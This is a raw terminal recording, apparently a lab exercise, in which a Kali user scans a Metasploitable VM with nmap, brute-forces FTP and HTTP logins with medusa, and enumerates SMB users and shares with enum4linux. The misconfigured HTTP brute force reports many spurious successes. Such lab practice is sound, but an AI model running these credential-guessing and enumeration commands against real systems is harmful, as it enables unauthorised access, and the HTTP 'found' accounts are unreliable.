@@ -1,0 +1,820 @@
+Script started on 2025-11-28 20:19:34-03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="77" LINES="28"]
+                                                                             ]0;kali@kali: ~[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hshutdown -r now[15D[36ms[36mh[36mu[36mt[36md[36mo[36mw[36mn[39m [32m-[32mr[39m[4C[15D[36mi[36mf[36mc[36mo[36mn[36mf[36mi[36mg[39m [39m [39m     [8D[36ms[36mh[36mu[36mt[36md[36mo[36mw[36mn[39m -r now[32m-[32mr[39m[4C[15D[39m [39m [39m [39m [39m [39m [39m [39m  [39m [39m     [15Dshutdown -r now[15D[36ms[36mh[36mu[36mt[36md[36mo[36mw[36mn[39m [32m-[32mr[39m[4C[15D[36mi[36mf[36mc[36mo[36mn[36mf[36mi[36mg[39m [39m [39m     [8D[36mb[36ma[36ms[36mh[39m[39m [39m [39m [39m 
+[36msud[39mo systemctl enable auditd[K
+sudo systemctl start auditd[K[A[A[20D[36mh[39m[1B[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [36ms[36my[36ms[36mt[36me[36mm[36mc[36mt[36ml[39m[1B[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [36ms[36my[36ms[36mt[36me[36mm[36mc[36mt[36ml[39m[13C[A[1B[A[A[4C[36mi[36mf[36mc[36mo[39m[1m[34mn[0m[39m[4m[32mfig[24m[39m[1B[K[1B[K[A[A[12C[36mo[0m[36mn[24m[36mf[24m[36mi[24m[36mg[39m[8D[36ms[36mh[36mu[36mt[36md[36mo[36mw[36mn[39m -r now[32m-[32mr[39m[4C[15D[39m [39m [39m [39m [39m [39m [39m [39m  [39m [39m     [15Dp[4mp[24m[4mp[4mi[24m[4mp[4mi[4mn[24m[4mn[4mg[24m[24m[36mp[24m[36mi[24m[36mn[24m[36mg[39m[36mg[36m [39m[36mg[39m[39m 192.168.56.102[?1l>[?2004l[1BPING 192.168.56.102 (192.168.56.102) 56(84) bytes of data.
+64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=0.819 ms
+64 bytes from 192.168.56.102: icmp_seq=2 ttl=64 time=0.946 ms
+64 bytes from 192.168.56.102: icmp_seq=3 ttl=64 time=0.947 ms
+64 bytes from 192.168.56.102: icmp_seq=4 ttl=64 time=0.737 ms
+64 bytes from 192.168.56.102: icmp_seq=5 ttl=64 time=0.800 ms
+64 bytes from 192.168.56.102: icmp_seq=6 ttl=64 time=1.03 ms
+64 bytes from 192.168.56.102: icmp_seq=7 ttl=64 time=1.67 ms
+^C
+--- 192.168.56.102 ping statistics ---
+7 packets transmitted, 7 received, 0% packet loss, time 6006ms
+rtt min/avg/max/mdev = 0.737/0.992/1.670/0.292 ms
+                                                                             ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hnmap -sV -p 21,22,80,445,139 192.168.56.102[43D[36mn[36mm[36ma[36mp[39m [32m-[32ms[32mV[39m [32m-[32mp[39m[32C[?1l>[?2004l
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 20:20 -03
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.102
+Host is up (0.00080s latency).
+
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+MAC Address: 08:00:27:EA:41:94 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.47 seconds
+                                                                             ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[A[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m ftp 192.168.56.102[18D[36mf[36mt[36mp[39m[15C[?1l>[?2004l
+Connected to 192.168.56.102.
+220 (vsFTPd 2.3.4)
+Name (192.168.56.102:kali): admin
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> quit
+221 Goodbye.
+                                                                                                                                                               ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hecho -e "user\nmsfadmin\nadmin\nroot" > users.txt[49D[36me[36mc[36mh[36mo[39m [32m-[32me[39m [33m"[33mu[33ms[33me[33mr[33m\[33mn[33mm[33ms[33mf[33ma[33md[33mm[33mi[33mn[33m\[33mn[33ma[33md[33mm[33mi[33mn[33m\[33mn[33mr[33mo[33mo[33mt[33m"[39m [1m[34m>[0m[39m[10C[?1l>[?2004l
+                                                                                                                                                               ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hecho -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt[55D[36me[36mc[36mh[36mo[39m [32m-[32me[39m [33m"[33m1[33m2[33m3[33m4[33m5[33m6[33m\[33mn[33mp[33ma[33ms[33ms[33mw[33mo[33mr[33md[33m\[33mn[33mq[33mw[33me[33mr[33mt[33my[33m\[33mn[33mm[33ms[33mf[33ma[33md[33mm[33mi[33mn[33m"[39m [1m[34m>[0m[39m[9C[?1l>[?2004l
+                                                                                                                                                               ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hmedusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6[61D[36mm[36me[36md[36mu[36ms[36ma[39m [32m-[32mh[39m[16C[32m-[32mU[39m [1mu[1ms[1me[1mr[1ms[1m.[1mt[1mx[1mt[0m [32m-[32mP[39m [1mp[1ma[1ms[1ms[1m.[1mt[1mx[1mt[0m [32m-[32mM[39m[5C[32m-[32mt[39m[2C[?1l>[?2004l
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2025-11-28 20:32:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (1 of 4 complete)
+2025-11-28 20:32:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (2 of 4 complete)
+2025-11-28 20:32:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (3 of 4 complete)
+2025-11-28 20:32:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: qwerty (4 of 4 complete)
+2025-11-28 20:32:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 123456 (1 of 4 complete)
+2025-11-28 20:32:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password (2 of 4 complete)
+2025-11-28 20:32:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
+2025-11-28 20:32:03 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+2025-11-28 20:32:06 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
+2025-11-28 20:32:06 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
+2025-11-28 20:32:06 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
+2025-11-28 20:32:06 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: qwerty (3 of 4 complete)
+2025-11-28 20:32:06 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (1 of 4 complete)
+2025-11-28 20:32:06 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
+2025-11-28 20:32:09 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
+2025-11-28 20:32:09 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
+2025-11-28 20:32:09 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
+                                                                                                                                                               ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hmedusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6[61D[36mm[36me[36md[36mu[36ms[36ma[39m [32m-[32mh[39m[16C[32m-[32mU[39m [1mu[1ms[1me[1mr[1ms[1m.[1mt[1mx[1mt[0m [32m-[32mP[39m [1mp[1ma[1ms[1ms[1m.[1mt[1mx[1mt[0m [32m-[32mM[39m[5C[32m-[32mt[39m[2C[61D[36me[36mc[36mh[36mo[36m [36m-[39me[32m [32m"[39m123456\npassword[32m\[32mn[39mq[1mw[1me[1mr[1mt[1my[1m\[1mn[1mm[1ms[0mf[32ma[32md[39mm[1mi[1mn[1m"[1m [1m>[1m [1mp[1ma[0ms[32ms[32m.[39mtxt  [39m [39m   [52D[36mo[39m[39m [32m-[32me[39m[39m [33m"[33m1[33m2[33m3[33m4[33m5[33m6[33m\[33mn[33mp[33ma[33ms[33ms[33mw[33mo[33mr[33md[33m\[33mn[33mq[0m[33mw[0m[33me[0m[33mr[0m[33mt[0m[33my[0m[33m\[0m[33mn[0m[33mm[0m[33ms[33mf[33ma[33md[33mm[0m[33mi[0m[33mn[0m[33m"[39m[0m [1m[34m>[0m[39m[0m [1mp[1ma[1ms[39m[1ms[39m[1m.[1mt[1mx[1mt[0m[46D[33mu[33ms[33me[33mr[39m[20P[10C[33m\[33mn[0m[33ma[33md[0m[33mm[0m[33mi[0m[33mn[0m[33m\[0m[33mn[0m[33mr[0m[33mo[0m[33mo[33mt" > user[39ms[1m[34m.[0m[39mt[1mxt[0m      [13D[33m"[39m[39m [1m[34m>[0m[39m[39m [39m[1mu[39m[1ms[39m[1me[39m[1mr[1ms[39m[1m.[1mt[2C[49D[0m[36mf[36mt[36mp[36m [39m1[32m9[32m2[39m.[33m1[33m6[33m8[33m.[33m5[33m6[33m.[33m1[33m0[33m2[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m  [0m[39m  [0m [0m [0m [0m [0m [0m [0m [0m [0m [31D[16D[36mp[39m[39m 1[39m9[39m2.[39m1[39m6[39m8[39m.[39m5[39m6[39m.[39m1[39m0[39m2[?1l>[?2004l
+Connected to 192.168.56.102.
+220 (vsFTPd 2.3.4)
+Name (192.168.56.102:kali): msfadmin
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> quit
+221 Goodbye.
+                                                                                                                                                               ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hc[4mc[24m[4mc[4ml[24m[4mc[4ml[4me[24m[4me[4ma[24m[4ma[4mr[24m[24m[36mc[24m[36ml[24m[36me[24m[36ma[24m[36mr[39m[?1l>[?2004l
+[H[2J[3J                                                                                                                                                               ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hclear[36mc[36ml[36me[36ma[36mr[39m[39m [39m [39m [39m [39m clear[36mc[36ml[36me[36ma[36mr[39m[36mf[36mt[36mp[36m [36m1[39m92.168.56.102[16D[36mp[39m[39m [39m1[13C[18D[36mc[36ml[36me[39mar             [13D[36me[36ma[36mr[39m[39m [39m [39m [39m [39m medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
+ -m PAGE:'/dvma/login.php' \[K
+ -m FORM:'username=^USER^&password=^PASS^&Login=Login' \[K
+ -m 'FAIL=Login failed' -t 6[K[3A[24D[36mm[36me[36md[36mu[36ms[36ma[39m [32m-[32mh[39m[16C[32m-[32mU[39m [1mu[1ms[1me[1mr[1ms[1m.[1mt[1mx[1mt[0m [32m-[32mP[39m [1mp[1ma[1ms[1ms[1m.[1mt[1mx[1mt[0m [32m-[32mM[39m[1B [32m-[32mm[39m[6C[33m'[33m/[33md[33mv[33mm[33ma[33m/[33ml[33mo[33mg[33mi[33mn[33m.[33mp[33mh[33mp[33m'[39m[1B [32m-[32mm[39m[6C[33m'[33mu[33ms[33me[33mr[33mn[33ma[33mm[33me[33m=[33m^[33mU[33mS[33mE[33mR[33m^[33m&[33mp[33ma[33ms[33ms[33mw[33mo[33mr[33md[33m=[33m^[33mP[33mA[33mS[33mS[33m^[33m&[33mL[33mo[33mg[33mi[33mn[33m=[33mL[33mo[33mg[33mi[33mn[33m'[39m[1B [32m-[32mm[39m [33m'[33mF[33mA[33mI[33mL[33m=[33mL[33mo[33mg[33mi[33mn[33m [33mf[33ma[33mi[33ml[33me[33md[33m'[39m [32m-[32mt[39m[2C[?1l>[?2004l
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+2025-11-28 20:51:01 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
+2025-11-28 20:51:01 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: msfadmin [SUCCESS]
+2025-11-28 20:51:01 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: qwerty (1 of 4 complete)
+2025-11-28 20:51:01 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: qwerty [SUCCESS]
+2025-11-28 20:51:01 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (1 of 4 complete)
+2025-11-28 20:51:01 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: 123456 [SUCCESS]
+2025-11-28 20:51:01 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
+2025-11-28 20:51:01 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: 123456 [SUCCESS]
+2025-11-28 20:51:01 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 5 complete) Password: 123456 (2 of 4 complete)
+2025-11-28 20:51:01 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: 123456 [SUCCESS]
+2025-11-28 20:51:01 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 6 complete) Password: password (3 of 4 complete)
+2025-11-28 20:51:01 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: password [SUCCESS]
+2025-11-28 20:51:02 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 7 complete) Password: 123456 (2 of 4 complete)
+2025-11-28 20:51:02 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: 123456 [SUCCESS]
+2025-11-28 20:51:02 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 8 complete) Password: qwerty (3 of 4 complete)
+2025-11-28 20:51:02 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: qwerty [SUCCESS]
+2025-11-28 20:51:02 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 9 complete) Password: password (4 of 4 complete)
+2025-11-28 20:51:02 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: password [SUCCESS]
+                                                                                                                                                               ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004henumforlinux -a 192.168.56.102 | tee enum4_output.txt[53D[4me[4mn[4mu[4mm[4mf[4mo[4mr[4ml[4mi[4mn[4mu[4mx[24m [32m-[32ma[39m[16C[1m[34m|[0m[39m [36mt[36me[36me[39m[17C[?1l>[?2004l
+enumforlinux: command not found
+                                                                                                                                                               ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004henumforlinux -a 192.168.56.102 | tee enum4_output.txt[53D[4me[4mn[4mu[4mm[4mf[4mo[4mr[4ml[4mi[4mn[4mu[4mx[24m [32m-[32ma[39m[16C[1m[34m|[0m[39m [36mt[36me[36me[39m [1me[1mn[1mu[1mm[1m4[1m_[1mo[1mu[1mt[1mp[1mu[1mt[1m.[1mt[1mx[1mt[0m[P[46C [47D[P[46C [47D[P[46C [47D[4m4[4ml[4mi[4mn[4mu[4mx[24m[39m [32m-[32ma[39m 192.168.56.102[0m[39m [1m[34m|[0m[39m[39m [36mt[36me[36me[39m[0m [1me[1mn[1mu[1mm[1m4[1m_[1mo[1mu[1mt[1mp[1mu[1mt[1m.[1mt[1mx[1mt[0m[46D[24m[36me[24m[36mn[24m[36mu[24m[36mm[24m[36m4[24m[36ml[24m[36mi[24m[36mn[24m[36mu[24m[36mx[39m[?1l>[?2004l
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 28 21:01:09 2025
+
+[34m =========================================( [0m[32mTarget Information[0m[34m )=========================================
+
+[0mTarget ........... 192.168.56.102
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+[34m ===========================( [0m[32mEnumerating Workgroup/Domain on 192.168.56.102[0m[34m )===========================
+
+[0m[33m
+[+] [0m[32mGot domain/workgroup name: WORKGROUP
+
+[0m
+[34m ===============================( [0m[32mNbtstat Information for 192.168.56.102[0m[34m )===============================
+
+[0mLooking up status of 192.168.56.102
+	METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
+	METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
+	METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
+	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+	MAC Address = 00-00-00-00-00-00
+
+[34m ==================================( [0m[32mSession Check on 192.168.56.102[0m[34m )==================================
+
+[0m[33m
+[+] [0m[32mServer 192.168.56.102 allows sessions using username '', password ''
+
+[0m
+[34m ===============================( [0m[32mGetting domain SID for 192.168.56.102[0m[34m )===============================
+
+[0mDomain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[33m
+[+] [0m[32mCan't determine if host is part of domain or part of a workgroup
+
+[0m
+[34m ==================================( [0m[32mOS information on 192.168.56.102[0m[34m )==================================
+
+[0m[33m
+[E] [0m[31mCan't get OS info with smbclient
+
+[0m[33m
+[+] [0m[32mGot OS info for 192.168.56.102 from srvinfo: 
+[0m	METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)
+	platform_id     :	500
+	os version      :	4.9
+	server type     :	0x9a03
+
+
+[34m ======================================( [0m[32mUsers on 192.168.56.102[0m[34m )======================================
+
+[0mindex: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games	Name: games	Desc: (null)
+index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody	Name: nobody	Desc: (null)
+index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind	Name: (null)	Desc: (null)
+index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy	Name: proxy	Desc: (null)
+index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog	Name: (null)	Desc: (null)
+index: 0x6 RID: 0xbba acb: 0x00000010 Account: user	Name: just a user,111,,	Desc: (null)
+index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data	Name: www-data	Desc: (null)
+index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root	Name: root	Desc: (null)
+index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news	Name: news	Desc: (null)
+index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres	Name: PostgreSQL administrator,,,	Desc: (null)
+index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin	Name: bin	Desc: (null)
+index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail	Name: mail	Desc: (null)
+index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd	Name: (null)	Desc: (null)
+index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd	Name: (null)	Desc: (null)
+index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp	Name: (null)	Desc: (null)
+index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon	Name: daemon	Desc: (null)
+index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd	Name: (null)	Desc: (null)
+index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man	Name: man	Desc: (null)
+index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp	Name: lp	Desc: (null)
+index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql	Name: MySQL Server,,,	Desc: (null)
+index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats	Name: Gnats Bug-Reporting System (admin)	Desc: (null)
+index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid	Name: (null)	Desc: (null)
+index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup	Name: backup	Desc: (null)
+index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin	Name: msfadmin,,,	Desc: (null)
+index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd	Name: (null)	Desc: (null)
+index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys	Name: sys	Desc: (null)
+index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog	Name: (null)	Desc: (null)
+index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix	Name: (null)	Desc: (null)
+index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service	Name: ,,,	Desc: (null)
+index: 0x1e RID: 0x434 acb: 0x00000011 Account: list	Name: Mailing List Manager	Desc: (null)
+index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc	Name: ircd	Desc: (null)
+index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp	Name: (null)	Desc: (null)
+index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55	Name: (null)	Desc: (null)
+index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync	Name: sync	Desc: (null)
+index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp	Name: uucp	Desc: (null)
+
+user:[games] rid:[0x3f2]
+user:[nobody] rid:[0x1f5]
+user:[bind] rid:[0x4ba]
+user:[proxy] rid:[0x402]
+user:[syslog] rid:[0x4b4]
+user:[user] rid:[0xbba]
+user:[www-data] rid:[0x42a]
+user:[root] rid:[0x3e8]
+user:[news] rid:[0x3fa]
+user:[postgres] rid:[0x4c0]
+user:[bin] rid:[0x3ec]
+user:[mail] rid:[0x3f8]
+user:[distccd] rid:[0x4c6]
+user:[proftpd] rid:[0x4ca]
+user:[dhcp] rid:[0x4b2]
+user:[daemon] rid:[0x3ea]
+user:[sshd] rid:[0x4b8]
+user:[man] rid:[0x3f4]
+user:[lp] rid:[0x3f6]
+user:[mysql] rid:[0x4c2]
+user:[gnats] rid:[0x43a]
+user:[libuuid] rid:[0x4b0]
+user:[backup] rid:[0x42c]
+user:[msfadmin] rid:[0xbb8]
+user:[telnetd] rid:[0x4c8]
+user:[sys] rid:[0x3ee]
+user:[klog] rid:[0x4b6]
+user:[postfix] rid:[0x4bc]
+user:[service] rid:[0xbbc]
+user:[list] rid:[0x434]
+user:[irc] rid:[0x436]
+user:[ftp] rid:[0x4be]
+user:[tomcat55] rid:[0x4c4]
+user:[sync] rid:[0x3f0]
+user:[uucp] rid:[0x3fc]
+
+[34m ================================( [0m[32mShare Enumeration on 192.168.56.102[0m[34m )================================
+
+[0m
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk      
+	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            METASPLOITABLE
+[33m
+[+] [0m[32mAttempting to map shares on 192.168.56.102
+
+[0m//192.168.56.102/print$	[35mMapping: [0mDENIED[35m Listing: [0mN/A[35m Writing: [0mN/A
+//192.168.56.102/tmp	[35mMapping: [0mOK[35m Listing: [0mOK[35m Writing: [0mN/A
+//192.168.56.102/opt	[35mMapping: [0mDENIED[35m Listing: [0mN/A[35m Writing: [0mN/A
+[33m
+[E] [0m[31mCan't understand response:
+
+[0mNT_STATUS_NETWORK_ACCESS_DENIED listing \*
+//192.168.56.102/IPC$	[35mMapping: [0mN/A[35m Listing: [0mN/A[35m Writing: [0mN/A
+//192.168.56.102/ADMIN$	[35mMapping: [0mDENIED[35m Listing: [0mN/A[35m Writing: [0mN/A
+
+[34m ===========================( [0m[32mPassword Policy Information for 192.168.56.102[0m[34m )===========================
+
+[0m
+
+[+] Attaching to 192.168.56.102 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+	[+] METASPLOITABLE
+	[+] Builtin
+
+[+] Password Info for Domain: METASPLOITABLE
+
+	[+] Minimum password length: 5
+	[+] Password history length: None
+	[+] Maximum password age: Not Set
+	[+] Password Complexity Flags: 000000
+
+		[+] Domain Refuse Password Change: 0
+		[+] Domain Password Store Cleartext: 0
+		[+] Domain Password Lockout Admins: 0
+		[+] Domain Password No Clear Change: 0
+		[+] Domain Password No Anon Change: 0
+		[+] Domain Password Complex: 0
+
+	[+] Minimum password age: None
+	[+] Reset Account Lockout Counter: 30 minutes 
+	[+] Locked Account Duration: 30 minutes 
+	[+] Account Lockout Threshold: None
+	[+] Forced Log off Time: Not Set
+
+
+[33m
+[+] [0m[32mRetieved partial password policy with rpcclient:
+
+
+[0mPassword Complexity: Disabled
+Minimum Password Length: 0
+
+
+[34m ======================================( [0m[32mGroups on 192.168.56.102[0m[34m )======================================
+
+[0m[33m
+[+] [0m[32mGetting builtin groups:
+
+[0m[33m
+[+] [0m[32m Getting builtin group memberships:
+
+[0m[33m
+[+] [0m[32m Getting local groups:
+
+[0m[33m
